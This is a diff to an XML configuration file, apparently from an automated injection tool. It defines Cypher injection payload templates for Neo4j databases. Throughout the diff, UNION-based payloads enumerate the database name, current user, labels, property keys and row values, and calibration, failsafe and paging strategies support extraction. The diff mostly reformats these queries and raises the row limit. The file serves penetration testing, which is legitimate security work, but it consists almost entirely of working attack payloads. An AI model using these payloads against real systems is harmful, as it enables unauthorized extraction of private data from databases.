@@ -3,85 +3,91 @@
     <vendor></vendor>
     <resource>
         <info>
-'a'as A limit 0 union 
+'' AS A LIMIT 0 UNION 
 MATCH (n)
-RETURN distinct 
-'${LEAD}' 
-%2b 'version'
-%2b '${ENCLOSE_VALUE_SQL}' 
-%2b 'database()' 
-%2b '${ENCLOSE_VALUE_SQL}' 
-%2b 'current_user()' 
-%2b '${TRAIL_SQL}'
+RETURN DISTINCT 
+    '${LEAD}' 
+    %2b '-'
+    %2b '${ENCLOSE_VALUE_SQL}' 
+    %2b '-' 
+    %2b '${ENCLOSE_VALUE_SQL}' 
+    %2b '-' 
+    %2b '${TRAIL_SQL}'
         </info>
         <schema>
             <database>
-'a'as A limit 0 union
+'' AS A LIMIT 0 UNION
 MATCH (n)
-RETURN distinct '${LEAD}' 
-%2b '${ENCLOSE_VALUE_SQL}neo4j${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
- AS A
+RETURN DISTINCT 
+    '${LEAD}${ENCLOSE_VALUE_SQL}neo4j${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+    AS A
 {limit}
-union match (n:aze) return 'a'
+UNION MATCH (n:blah) RETURN n
             </database>
             <table>
-'a'as A limit 0 union
+'' AS A LIMIT 0 UNION
 CALL db.labels() 
 YIELD label 
+WITH label
+{limit}
 RETURN 
     '${LEAD}' 
-%2b reduce(
-        totalAge = '', 
-        n in collect(label) | 
-        totalAge 
-        %2b '${ENCLOSE_VALUE_SQL}'
-        %2b n 
-        %2b '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+    %2b reduce(
+        b = '', 
+        n IN collect(label) | 
+            b 
+            %2b '${ENCLOSE_VALUE_SQL}'
+            %2b n 
+            %2b '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
     ) 
-%2b '${TRAIL_SQL}'
- AS A
-{limit}
-union match (n:aze) return 'a'
+    %2b '${TRAIL_SQL}'
+    AS A
+UNION MATCH (n:blah) RETURN n
             </table>
             <column>
-'a'as A limit 0 union
+'' AS A LIMIT 0 UNION
 MATCH (n:${TABLE}) 
-with collect(keys(n)) as attr 
-unwind attr as r 
-with distinct r[0] as d 
-order by d 
-return 
+WITH collect(keys(n)) AS attr 
+UNWIND attr AS r 
+WITH DISTINCT r[0] AS d 
+ORDER BY d 
+{limit}
+RETURN 
     '${LEAD}' 
-%2b reduce(
-        totalAge = '', 
-        n in collect(d) | 
-        totalAge 
+    %2b reduce(
+        b = '', 
+        n IN collect(d) | 
+        b 
         %2b '${ENCLOSE_VALUE_SQL}'
         %2b n
         %2b '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
     ) 
 %2b '${TRAIL_SQL}'
- AS A
-{limit}
-union match (n:aze) return 'a'
+AS A
+UNION MATCH (n:blah) RETURN n
             </column>
             <row>
                 <query>
-'a'as A limit 0 union
-MATCH (n:${TABLE}) RETURN '${LEAD}' 
-%2b 
-reduce(totalAge = "", n in collect(n) | totalAge %2b 
- '${ENCLOSE_VALUE_SQL}'
+'' AS A LIMIT 0 UNION
+MATCH (n:${TABLE})
+WITH DISTINCT n
+{limit}
+RETURN 
+    '${LEAD}' 
+    %2b reduce(
+        b = "", 
+        n IN collect(n) | 
+        b 
+        %2b '${ENCLOSE_VALUE_SQL}'
         %2b ${FIELDS}
         %2b '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
-)
+    )
 %2b '${TRAIL_SQL}'
- AS A
-{limit}
-union match (n:aze) return 'a'
+AS A
+UNION MATCH (n:blah) RETURN n
                 </query>
                 <fields>
-                    <field>coalesce(n.${FIELD},"")</field>
+                    <field>coalesce(n.${FIELD}, '')</field>
                     <concat>%2b '%7f' %2b</concat>
                 </fields>
             </row>
@@ -90,15 +96,25 @@ union match (n:aze) return 'a'
     <strategy>
         <configuration>
             <slidingWindow>${INJECTION}</slidingWindow>
-            <limit>skip ${LIMIT} limit 1</limit>
+            <limit>skip ${LIMIT} LIMIT 65536</limit>
             <failsafe>MATCH (n) RETURN 1337${INDICE}7330%2b1 AS A</failsafe>
-            <calibrator>'a'as A limit 0 union MATCH (n) RETURN '${LEAD}${INDICE}' %2b reduce(a = "", nn in collect(n) | a %2b "${CALIBRATOR_SQL}")</calibrator>
+            <calibrator>
+'' AS A LIMIT 0 UNION 
+MATCH (n) 
+RETURN 
+    '${LEAD}${INDICE}'
+    %2b reduce(
+        a = "", 
+        nn IN collect(n) | 
+        a %2b "${CALIBRATOR_SQL}"
+    )
+            </calibrator>
             <limitBoundary>0</limitBoundary>
         </configuration>
         <normal>
-            <indices>RETURN 'A' AS A union ${INDICES}</indices>
+            <indices>RETURN 'A' AS A UNION ${INDICES}</indices>
             <capacity>${CALIBRATOR}</capacity>
-            <orderBy>order by 1337</orderBy>
+            <orderBy>ORDER BY 1337</orderBy>
         </normal>
     </strategy>
 </model>
